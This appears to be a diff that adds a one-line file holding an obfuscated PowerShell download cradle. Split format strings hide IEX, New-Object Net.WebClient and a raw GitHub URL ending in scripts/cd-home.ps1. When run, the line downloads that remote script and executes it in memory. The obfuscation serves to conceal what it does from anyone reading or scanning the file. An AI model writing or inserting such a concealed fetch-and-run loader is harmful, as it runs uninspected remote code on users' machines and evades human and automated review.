@@ -1,0 +1,1 @@
+﻿.("{1}{0}" -f 'X','IE')(.("{0}{2}{1}" -f'new-o','ect','bj') net.webclient).DownloadString((("{0}{1}"-f 'ht','tps')+("{2}{0}{1}"-f'w','.git','://ra')+'hub'+'us'+'e'+'r'+("{0}{1}"-f 'co','nt')+("{1}{0}{2}{3}"-f'nt.c','e','o','m/I')+'oTS'+'ha'+("{1}{0}" -f 'Po','rk/')+("{0}{1}"-f 'werSh','e')+'ll/'+'m'+'ain'+'/'+'sc'+("{0}{1}{2}{3}"-f 'r','ipts/cd-h','ome.','ps1')))
